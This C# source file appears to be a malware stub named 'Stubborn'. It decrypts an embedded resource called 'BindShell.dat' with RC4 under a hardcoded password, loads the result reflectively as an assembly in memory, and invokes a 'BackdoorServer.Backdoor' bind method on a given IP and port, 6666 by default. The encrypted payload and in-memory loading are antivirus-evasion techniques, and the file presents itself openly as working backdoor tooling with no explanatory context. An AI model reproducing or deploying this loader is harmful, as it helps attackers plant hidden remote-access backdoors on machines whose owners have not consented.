using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace Stubborn
{
    class Program
    {
        static void Main(string[] args)
        {
            //default if not passed as arguments
            string ip = "localhost";
            Int32 port = 6666;
            if (args != null)
            {
                if (args.Length == 2) {
                    ip = args[0];
                    Int32.TryParse(args[1], out port);
                }
            }
            //decoding pwd
            byte[] pass = Encoding.Default.GetBytes("Aa123456");
            //I search for the included encrypted file and I load the class on the fly...
            foreach (string name in Assembly.GetExecutingAssembly().GetManifestResourceNames())
            {
                if (name.Equals("Stubborn.BindShell.dat", StringComparison.InvariantCultureIgnoreCase))
                {
                    using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                    {
                        int streamEnd = Convert.ToInt32(stream.Length);
                        byte[] buffer = new byte[streamEnd];
                        stream.Read(buffer, 0, streamEnd);
                        //decode
                        byte[] buff_dec = RC4.Decrypt(pass, buffer);
                        Assembly pay = Assembly.Load(buff_dec);
                        object o = pay.CreateInstance("BackdoorServer.Backdoor");

                        Type t = o.GetType();
                        MethodInfo mi = t.GetMethod("_bind");
                        //p
                        object[] p = { ip,port };
                        object s = mi.Invoke(o, p);
                    }
                    break;
                }
            }
        }
    }

    public class RC4
    {

        public static byte[] Encrypt(byte[] pwd, byte[] data)
        {
            int a, i, j, k, tmp;
            int[] key, box;
            byte[] cipher;

            key = new int[256];
            box = new int[256];
            cipher = new byte[data.Length];

            for (i = 0; i < 256; i++)
            {
                key[i] = pwd[i % pwd.Length];
                box[i] = i;
            }
            for (j = i = 0; i < 256; i++)
            {
                j = (j + box[i] + key[i]) % 256;
                tmp = box[i];
                box[i] = box[j];
                box[j] = tmp;
            }
            for (a = j = i = 0; i < data.Length; i++)
            {
                a++;
                a %= 256;
                j += box[a];
                j %= 256;
                tmp = box[a];
                box[a] = box[j];
                box[j] = tmp;
                k = box[((box[a] + box[j]) % 256)];
                cipher[i] = (byte)(data[i] ^ k);
            }
            return cipher;
        }

        public static byte[] Decrypt(byte[] pwd, byte[] data)
        {
            return Encrypt(pwd, data);
        }

    }
}
